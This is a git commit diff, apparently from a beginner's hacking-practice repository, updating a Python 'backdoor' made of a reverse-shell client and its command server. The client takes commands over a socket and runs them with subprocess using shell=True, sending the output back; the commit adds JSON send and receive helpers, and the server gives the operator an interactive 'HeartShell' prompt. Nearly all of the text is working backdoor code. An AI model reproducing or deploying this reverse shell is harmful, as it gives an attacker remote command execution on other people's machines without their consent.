9928433c9e4548935632c08ce2d3e3bd5543aeb8
NguyenMinhDucIT <ducc.minh.ngn@gmail.com>
2022-12-08 00:09:14 +0700

    Update 8/12: add reliable_recv and reliable_send function. Need focus when manipulating with data cause the type changes constantly (bytes <--> string)

--- backdoor/reverse_shell.py
+++ backdoor/reverse_shell.py
@@ -2,12 +2,29 @@
 
 import socket
 import subprocess as sp
+import json
+
+
+def reliable_send(data):
+	json_data = json.dumps(data.decode('utf-8')) # decode from bytes to work with JSON
+	s.send(json_data.encode('utf-8')) # encoding data to send 
+
+
+def reliable_recv():
+	data = ""
+	while True:
+		try:
+			data = data + s.recv(1024).decode('utf-8') # decode to concatenate string
+			return json.loads(data)
+		except ValueError:
+			continue
 
 
 def shell():
 	while True:
-		command = s.recv(1024).decode('utf-8')
-
+		# command = reliable_recv().decode('utf-8') # ?need decode ???
+		command = reliable_recv() # answer line 25: nope because data is already decoded in the reliable_recv function
+		
 		# Use b'q' because the command variable is a byte type after receiving from the server' --> Just use decode :))
 		if command == 'q':
 			break
@@ -15,7 +32,7 @@ def shell():
 			proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
 			result = proc.stdout.read() + proc.stderr.read() # Apparently the data return from proc or maybe function read() from subprocess is already returned as bytes :))
 
-			s.send(result)
+			reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
--- backdoor/server.py
+++ backdoor/server.py
@@ -2,18 +2,37 @@
 
 import socket
 from termcolor import colored
+import json
+
+
+
+def reliable_send(data):
+	json_data = json.dumps(data) 
+	target.send(json_data.encode('utf-8')) # HERE IS WHERE THE DATA IS ENCODED TO SEND THROUGH SOCKET
+
+
+def reliable_recv():
+	data = ""
+	while True:
+		try:
+			data = data + target.recv(1024).decode('utf-8') # HERE IS WHERE DATA RECV DECODED FOR JSON MANIPULATION
+			return json.loads(data)
+		except ValueError:
+			continue
+
 
 def shell():
 	while True:
 		command = input(f"*HeartShell-{str(ip)}#: ") # data type String
-		target.send(command.encode('utf-8'))
-
+		# reliable_send(command.encode('utf-8')) # already dumps by json (? data type) --> need convert??
+		reliable_send(command) 	# answer line 27: no convert --> JSON doesn't apply to bytes
 		# End shell session
 		if command == 'q':
 			break
 		else:
-			result = target.recv(1024) # data type Bytes
-			print(result.decode('utf-8'))
+			# result = target.recv(1024) # data type Bytes
+			result = reliable_recv() # need decode??? --> nope, already decode in the function
+			print(result)
 
 def server():
 	# Creating global variables so that can be used in different functions
